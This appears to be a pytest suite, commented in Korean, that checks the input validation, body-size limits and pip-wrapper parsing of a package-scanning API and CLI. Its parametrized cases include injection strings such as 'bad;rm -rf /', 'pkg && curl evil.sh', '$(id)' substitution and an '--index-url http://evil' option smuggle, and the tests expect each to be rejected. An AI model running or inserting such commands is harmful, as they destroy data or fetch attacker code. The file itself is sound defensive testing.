"""보안 하드닝 테스트 (재웅 파트) — 입력값 검증 + 요청 크기 제한.

api/schemas.py 의 화이트리스트 검증과 api/main.py 의 body 크기 제한이
실제 HTTP 경계에서 동작하는지 확인한다. 전부 오프라인.
"""

from __future__ import annotations

from datetime import UTC, datetime

import pytest
from fastapi.testclient import TestClient

from api.main import MAX_BODY_BYTES, app
from api.schemas import ScanRequest


@pytest.fixture()
def client(tmp_path, monkeypatch):
    monkeypatch.setenv("SU_DB_PATH", str(tmp_path / "sec.db"))
    with TestClient(app) as c:
        yield c


# ──────────────────────────────
# 입력값 검증 — Command Injection 방지 화이트리스트
# ──────────────────────────────

@pytest.mark.parametrize(
    "name",
    [
        "bad;rm -rf /",          # 셸 명령 체이닝
        "pkg && curl evil.sh",   # 셸 연산자
        "pkg`id`",               # 커맨드 치환
        "pkg$(id)",
        "pkg name",              # 공백
        "-leading-dash",         # 옵션 인젝션 (pip 인자로 흘러갈 때)
        ".leading-dot",
        "trailing-",
        "한글패키지",             # PEP 503 밖의 문자
    ],
)
def test_scan_rejects_malicious_names(client, name):
    r = client.post("/api/v1/scan", json={"name": name, "version": "1.0.0"})
    assert r.status_code == 422


@pytest.mark.parametrize(
    "version",
    ["1.0; rm -rf /", "1.0 --index-url http://evil", "1.0`id`", "..", "+1.0", "1.0+"],
)
def test_scan_rejects_malicious_versions(client, version):
    r = client.post("/api/v1/scan", json={"name": "requests", "version": version})
    assert r.status_code == 422


@pytest.mark.parametrize(
    ("name", "version"),
    [
        ("requests", "2.31.0"),
        ("typing_extensions", "4.12.0"),      # 언더스코어 (wheel 파일명 유래)
        ("scikit-learn", "1.5.0"),
        ("a", "1"),                            # 한 글자 이름
        ("torch", "2.3.0+cpu"),                # PEP 440 local version
        ("pip", "1!23.0"),                     # PEP 440 epoch
        ("django", "4.0.0rc1"),
    ],
)
def test_valid_real_world_specs_pass(name, version):
    # 검증이 실존 패키지 스펙을 오탐으로 거부하면 프록시·CLI 가 통째로 죽는다.
    req = ScanRequest(name=name, version=version)
    assert req.name == name and req.version == version


# ──────────────────────────────
# 요청 본문 크기 제한 — DoS 방지
# ──────────────────────────────

def test_oversized_body_rejected_before_parsing(client):
    huge = b"x" * (MAX_BODY_BYTES + 1)
    r = client.post(
        "/api/v1/scan", content=huge, headers={"Content-Type": "application/json"}
    )
    assert r.status_code == 413
    assert r.json()["error"] == "payload_too_large"


def test_normal_body_passes_size_limit(client):
    # 크기 제한이 정상 요청까지 막으면 안 됨 — 422(내용 검증)가 아니라 413이 나오면 실패
    r = client.post("/api/v1/scan", json={"name": "bad;name", "version": "1.0"})
    assert r.status_code == 422  # 크기는 통과, 내용 검증에서 걸림


def test_chunked_body_cannot_bypass_the_size_limit(client):
    """Content-Length 만 검사하면 헤더 하나로 우회된다.

    ``Transfer-Encoding: chunked`` 요청에는 Content-Length 가 아예 없어서 헤더 검사를
    그냥 통과하고, 본문 전량이 그대로 메모리에 올라간다 — 막으려던 DoS 경로가 열려 있는
    셈이다. 실제로 도착한 바이트를 세는지 확인한다.
    """

    def chunks():
        for _ in range(20):
            yield b"x" * 4096  # 합계 80 KB > MAX_BODY_BYTES

    r = client.post(
        "/api/v1/scan", content=chunks(), headers={"Content-Type": "application/json"}
    )
    assert "content-length" not in {k.lower() for k in r.request.headers}
    assert r.status_code == 413
    assert r.json()["error"] == "payload_too_large"


def test_chunked_body_under_the_limit_still_works(client):
    """크기 검사가 정상적인 chunked 요청까지 막으면 안 된다."""

    def chunks():
        yield b'{"name": "requests",'
        yield b' "version": "2.31.0"}'

    r = client.post(
        "/api/v1/scan", content=chunks(), headers={"Content-Type": "application/json"}
    )
    assert r.status_code != 413


def test_malformed_content_length_is_refused(client):
    """길이를 신뢰할 수 없는 요청은 통과시키지 않는다."""
    r = client.post(
        "/api/v1/scan",
        content=b"{}",
        headers={"Content-Type": "application/json", "Content-Length": "not-a-number"},
    )
    assert r.status_code == 400
    assert r.json()["error"] == "bad_request"


# ──────────────────────────────
# CLI check-file 파서
# ──────────────────────────────

def test_check_file_line_parsing():
    from cli.su_scan import _parse_spec

    assert _parse_spec("requests==2.31.0") == ("requests", "2.31.0")
    assert _parse_spec("requests") == ("requests", None)


# ──────────────────────────────
# CLI 로컬 실행 (서버 불필요)
# ──────────────────────────────

def test_cli_defaults_to_local_execution(monkeypatch):
    """SU_API_URL 이 없으면 서버를 부르지 않는다 — CLI 하나로 스캔이 끝나야 한다."""
    from cli import su_scan

    monkeypatch.delenv("SU_API_URL", raising=False)
    assert su_scan._use_server() is False


def test_cli_uses_server_when_url_is_set(monkeypatch):
    """프록시·대시보드와 이력을 공유해야 할 때는 SU_API_URL 로 서버 경로를 고른다."""
    from cli import su_scan

    monkeypatch.setenv("SU_API_URL", "http://localhost:8000")
    assert su_scan._use_server() is True


def test_local_scan_runs_pipeline_without_http_server(tmp_path, monkeypatch):
    """로컬 경로가 실제로 run_scan 을 부르고 결과를 dict 로 돌려주는지.

    서버가 떠 있지 않아도 동작해야 하므로 HTTP 는 일절 타지 않는다.
    """
    from api.schemas import RiskSignals, ScanResponse, Verdict
    from cli import su_scan

    monkeypatch.delenv("SU_API_URL", raising=False)
    monkeypatch.setenv("SU_DB_PATH", str(tmp_path / "cli.db"))

    called = {}

    async def fake_run_scan(req, *, http, store):
        called["spec"] = (req.name, req.version)
        return ScanResponse(
            scan_id=1, ecosystem=req.ecosystem, name=req.name, version=req.version,
            scanned_at=datetime.now(UTC),
            verdict=Verdict.SAFE, risk_score=5, verdict_reasons=["탐지된 위협 없음"],
            vulnerabilities=[], static_findings=[],
            risk_signals=RiskSignals(
                is_new_account=False, typosquat_score=0.0,
                has_install_script=False, dependency_count=0, release_burst=False,
            ),
        )

    monkeypatch.setattr("api.routers.scan.run_scan", fake_run_scan)
    result = su_scan._scan("requests", "2.31.0")

    assert called["spec"] == ("requests", "2.31.0")
    assert result["verdict"] == "safe"


def test_local_scan_rejects_bad_names_like_the_api_does(tmp_path, monkeypatch):
    """화이트리스트 검증(api/schemas.py)은 로컬 경로에서도 똑같이 걸려야 한다.

    서버 경로에서만 422 로 막히고 CLI 로는 통과한다면, 검증을 우회하는 뒷문이 된다.
    """
    import typer

    from cli import su_scan

    monkeypatch.delenv("SU_API_URL", raising=False)
    monkeypatch.setenv("SU_DB_PATH", str(tmp_path / "cli.db"))

    with pytest.raises(typer.Exit) as exc:
        su_scan._scan("bad;rm -rf /", "1.0.0")
    assert exc.value.exit_code == 2


# ──────────────────────────────
# pip 래퍼 (guard) 인자 파싱
# ──────────────────────────────

@pytest.mark.parametrize(
    ("argv", "expected_specs", "expected_skipped"),
    [
        (["requests"], ["requests"], []),
        (["requests==2.31.0", "certifi"], ["requests==2.31.0", "certifi"], []),
        # 값을 먹는 플래그의 값이 패키지로 오인되면 안 된다.
        (["-t", "./libs", "requests"], ["requests"], []),
        (["--target", "libs", "requests"], ["requests"], []),
        (["-i", "https://pypi.org/simple", "requests"], ["requests"], []),
        # 값을 따로 안 먹는 플래그는 그냥 건너뛴다.
        (["--upgrade", "requests"], ["requests"], []),
        (["--no-deps", "-U", "requests"], ["requests"], []),
        # PyPI 이름이 아닌 것은 "스캔 못 함"으로 남아야 한다 — 조용히 삼키면 안 된다.
        (["./localpkg"], [], ["./localpkg"]),
        ([".", "requests"], ["requests"], ["."]),
        (["https://x/y.whl"], [], ["https://x/y.whl"]),
        (["git+https://github.com/a/b"], [], ["git+https://github.com/a/b"]),
        (["dist/foo-1.0-py3-none-any.whl"], [], ["dist/foo-1.0-py3-none-any.whl"]),
    ],
)
def test_guard_extracts_only_scannable_specs(argv, expected_specs, expected_skipped):
    from cli.su_scan import _extract_specs

    specs, skipped = _extract_specs(argv)
    assert specs == expected_specs
    assert skipped == expected_skipped


def test_guard_reads_requirements_file(tmp_path):
    """-r requirements.txt 도 스캔 대상에 들어와야 한다."""
    from cli.su_scan import _extract_specs

    req = tmp_path / "req.txt"
    req.write_text(
        "# 주석\nrequests==2.31.0\n\ncertifi\n--index-url https://x\n", encoding="utf-8"
    )
    specs, _ = _extract_specs(["-r", str(req)])
    assert specs == ["requests==2.31.0", "certifi"]


@pytest.mark.parametrize(
    ("spec", "name", "exact"),
    [
        ("requests==2.31.0", "requests", True),
        ("requests===2.31.0", "requests", True),
        ("requests[socks]==2.31.0", "requests", True),
        ("typing_extensions == 4.12.0", "typing_extensions", True),
    ],
)
def test_guard_resolves_exact_versions_without_network(spec, name, exact):
    """== 로 못박힌 스펙은 PyPI 조회 없이 그대로 쓴다."""
    from cli.su_scan import _resolve_spec

    resolved = _resolve_spec(spec)
    assert resolved is not None
    got_name, got_version, got_exact = resolved
    assert (got_name, got_exact) == (name, exact)
    assert got_version in ("2.31.0", "4.12.0")


def test_guard_marks_range_specs_as_inexact(monkeypatch):
    """>= 같은 범위는 pip 이 어떤 버전을 고를지 우리가 모른다 — 정확하지 않다고 표시해야 한다.

    조용히 최신 버전 결과만 보여주면 "이 버전을 검사했다"는 잘못된 인상을 준다.
    """
    from cli import su_scan

    monkeypatch.setattr(su_scan, "_resolve_latest", lambda n: "9.9.9")
    resolved = su_scan._resolve_spec("requests>=2.0")
    assert resolved == ("requests", "9.9.9", False)
